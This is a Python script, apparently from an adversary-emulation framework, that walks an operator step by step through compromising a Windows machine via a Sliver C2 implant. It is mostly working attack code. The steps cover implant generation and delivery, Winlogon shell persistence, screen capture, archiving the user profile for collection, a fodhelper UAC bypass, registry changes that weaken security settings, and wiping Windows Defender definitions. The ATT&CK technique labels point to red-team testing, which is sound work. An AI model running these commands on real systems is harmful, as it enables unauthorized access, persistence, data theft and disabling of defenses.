
import asyncio
from rich.console import Console
from rich.prompt import Confirm
from rich.panel import Panel
from typing import Dict
console = Console()
user_params: Dict[str, str] = {}
def print_welcome_message():
    console.print(
        Panel(
            "[bold blink yellow]🎯 Welcome to Attack Execution Wizard[/]",
            title="[bold green]Hello[/]",
            subtitle="[bold blue]Let's Begin[/]",
            expand=False,
        )
    )
def print_finished_message(message="Command completed!😊", status="info"):
    console.print(f"[bold green][FINISHED][/bold green] {message}")
def confirm_action(prompt: str = "Keep going with the next attack step?") -> bool:
    styled_prompt = f"[bold bright_cyan]{prompt}[/]"
    return Confirm.ask(
        styled_prompt,
        default="y",
        choices=["y", "n"],
        show_default=False,
    )      
async def main():
    print_welcome_message()
    from attack_executor.config import load_config
    config = load_config(config_file_path="/home/kali/Desktop/xiangmu/attack_executor-main/aurora/executor/config.ini")
    from attack_executor.post_exploit.Sliver import SliverExecutor
    sliver_executor = SliverExecutor(config=config)
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format shared --save #{SAVE_PATH}
        sliver > mtls --lport #{LPORT}
        """)
    confirm_action()
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the file on the attacker's machine
        3. Download the file to #{PATH}
        """)
    confirm_action()
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On victim's machine, use PowerShell or Command Prompt)
        regsvr32 #{DLL_PATH}
        """)
    confirm_action()


    # Sliver-session selection
    console.print("[bold cyan]\n[Sliver Executor] Session Selection[/]")
    sliver_sessionid = await sliver_executor.select_sessions()

    user_params["SessionID"] = sliver_sessionid

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: ifconfig[/]")
    confirm_action()
    try:
        await sliver_executor.ifconfig(user_params["SessionID"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    user_params["SessionID"] = sliver_sessionid

    confirm_action()
    commands = rf"""
    Get-Process

    """
    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
        sliver > mtls --lport #{LPORT}
        """)
    confirm_action()
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the target payload file
        3. Download the payload file
        4. Execute the payload file to #{PATH} as Admin (Root)
        """)
    confirm_action()

    confirm_action()

    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 10 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: binary_to_execute[/]")
    console.print(f"  Description: Path of binary to execute")
    default_val = "C:\Windows\System32\cmd.exe"
    user_input = console.input(
        f"[bold]➤ Enter value for binary_to_execute [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: binary_to_execute")
    user_params["binary_to_execute"] = user_input
    commands = rf"""
    Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, {user_params["binary_to_execute"]}" -Force

    """
    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()


    confirm_action()

    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 12 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: output_file[/]")
    console.print(f"  Description: Path where captured results will be placed")
    default_val = "$env:TEMP\T1113.png"
    user_input = console.input(
        f"[bold]➤ Enter value for output_file [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: output_file")
    user_params["output_file"] = user_input
    commands = rf"""
    Add-Type -AssemblyName System.Windows.Forms;$screen = [Windows.Forms.SystemInformation]::VirtualScreen;$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height;$graphic = [Drawing.Graphics]::FromImage($bitmap);$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size);$bitmap.Save("{user_params["output_file"]}")

    """
    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 13 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: remote_path[/]")
    console.print(f"  Description: Full path of the directory to create")
    default_val = ""
    user_input = console.input(
        f"[bold]➤ Enter value for remote_path [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: remote_path")
    user_params["remote_path"] = user_input

    user_params["SessionID"] = sliver_sessionid

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: mkdir[/]")
    confirm_action()
    try:
        await sliver_executor.mkdir(user_params["remote_path"], user_params["SessionID"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    confirm_action()

    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 14 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: input_file[/]")
    console.print(f"  Description: Path that should be compressed into our output file")
    default_val = "$env:USERPROFILE"
    user_input = console.input(
        f"[bold]➤ Enter value for input_file [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: input_file")
    user_params["input_file"] = user_input

    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 14 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: output_file[/]")
    console.print(f"  Description: Path where resulting compressed data should be placed")
    default_val = "$env:USERPROFILE\T1560-data-ps.zip"
    user_input = console.input(
        f"[bold]➤ Enter value for output_file [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: output_file")
    user_params["output_file"] = user_input
    commands = rf"""
    dir {user_params["input_file"]} -Recurse | Compress-Archive -DestinationPath {user_params["output_file"]}

    """
    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format shellcode --save #{SAVE_PATH}
        sliver > mtls --lport #{LPORT}
        """)
    confirm_action()

    confirm_action()

    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 16 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: executable_binary[/]")
    console.print(f"  Description: Binary to execute with UAC Bypass")
    default_val = "C:\Windows\System32\cmd.exe"
    user_input = console.input(
        f"[bold]➤ Enter value for executable_binary [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: executable_binary")
    user_params["executable_binary"] = user_input
    commands = f"""
    reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "{user_params["executable_binary"]}" /f
    reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
    fodhelper.exe
    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()


    confirm_action()
    commands = """
    reg add \"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v DisableLockWorkstation /t REG_DWORD /d 1 /f

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()
    commands = """
    reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()
    commands = """
    reg add \"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()
    commands = f"""
    reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services" /v "DisableSecuritySettings" /t REG_DWORD /d 1 /f
    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()
    commands = """
    reg add \"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\" /v HideSCANetwork /t REG_DWORD /d 1 /f

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()
    commands = """
    \"C:\Program Files\Windows Defender\MpCmdRun.exe\" -RemoveDefinitions -All

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    user_params["SessionID"] = sliver_sessionid


if __name__ == "__main__":
    asyncio.run(main())
